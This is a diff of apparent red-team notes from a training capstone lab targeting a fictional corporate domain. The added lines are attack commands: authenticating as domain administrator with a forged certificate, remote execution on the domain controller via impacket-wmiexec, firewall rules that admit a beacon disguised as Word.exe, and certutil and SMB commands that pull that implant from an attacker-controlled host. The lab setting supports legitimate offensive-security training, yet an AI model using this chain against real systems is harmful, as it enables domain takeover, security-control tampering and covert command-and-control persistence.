@@ -221,10 +221,19 @@ openssl x509 -in administrator_corpdc.pfx -text -noout
 proxychains4 certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx administrator_corpdc.pfx
 # Export the krbtgt
 export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache
-
 proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@CORPDC.corp.thereserve.loc
 
-certutil.exe -urlcache -split -f http://10.50.114.111:88/Word.exe Word.exe
+# Firewall Alterations
+netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
+netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
+netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Users\Administrator\Desktop\Word.exe" enable=yes
+# Beacon Drop
+# Either
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/DC1/Word.exe Word.exe
+
+# Share
+impacket-smbserver share $(pwd) -smb2support
+xcopy \\10.50.114.111\Share\Word.exe .
 
 
 # Linux beacon for later
